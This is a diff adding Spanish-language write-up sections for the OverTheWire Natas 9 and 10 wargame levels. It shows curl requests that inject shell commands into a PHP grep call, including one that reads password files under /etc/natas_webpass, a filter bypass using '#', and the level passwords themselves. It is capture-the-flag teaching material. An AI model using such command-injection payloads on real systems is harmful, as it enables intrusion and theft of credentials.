@@ -163,4 +163,51 @@ Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
 ```
 Mira pues si era, que bien :3
 
+## Natas9
+
+(Natas8)[http://natas9.natas.labs.overthewire.org]
+*Vulnerabilidad: OS command inyecion o inyeccion de comandos al sistema*
+
+Aqui nos sale un formulario, dice que econtrara una string a la palabra que le introduzcamos 
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas9.natas.labs.overthewire.org" -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -X POST -d "name=neddle&submit="
+# Un listado largo con "test" ->  testicle, testicle's, wettest, whitest
+```
+Esto ya huele un poco a un comando de bash ```grep test diccionario.txt``` En el enlace que se nos leakea "index-source.html" se confirma tal cosa
+```$key = $_REQUEST["needle"];  passthru("grep -i $key dictionary.txt");```
+
+¿Que pasa cuando te dejan meter input a un comando de bash? Pues que puedes meter mas comandos con el ";" que es concatenar comandos, es decir ejecutar
+otro comando despues del anterior del grep
+
+```console
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas9.natas.labs.overthewire.org" -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -X POST \
+> -d "needle=;pwd&submit="
+/var/www/natas/natas9
+
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas9.natas.labs.overthewire.org" -u natas9:W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl -X POST \
+> -d "needle=;cat ../../../../../etc/natas_webpass/natas10&submit=" | head -n 22
+```
+Siguiendo la logica de la ruta donde suele meter esto las contraseñas le hemos dicho que nos la suelte con el "cat" y hemos ido rutas para atras porque
+esto tira desde "/var/www/natas/natas9" y no desde "/"
+
+# Natas10
+
+
+(Natas8)[http://natas9.natas.labs.overthewire.org]
+*Vulnerabilidad: OS command inyecion o inyeccion de comandos al sistema*
+*Restricciones: no meter ciertos caracreres criticos como ;* 
+
+Este nivel es exactamente lo mismo que el anterior, solo que aqui nos filtran el input diciendoq que no podemos meter caracteres como ";"
+El tema es que si ponemos la ";" en urlencoder tambien la insterpretará y nos habremos saltado el filtro. ```php > echo urlencode(";");
+%3B``` Pero tampoco funciona
+
+Como el comando hace un ```curl palabra diccionario``` Lo que podemos es meterle nosotros el diccionario del que tirara y comnetando el original para que lo ignore. Para asegurarnos de que salgan resultados con el curl, lo mejor es poner letras indiviuales y probar. En este caso no sale hasta la c
+```
+[cucuxii@parrot]~[natas0]:$ curl -s "http://natas10.natas.labs.overthewire.org" -u natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu \
+> -X POST -d "needle=c /etc/natas_webpass/natas11 #&submit=" | head -n 23
+-X POST -d "needle=c /etc/natas_webpass/natas11 #&submit=" | head -n 23
+```
+Comando que resulta ``` grep c /etc/natas_webpass/natas11 # diccionario.txt ``
+
+
 
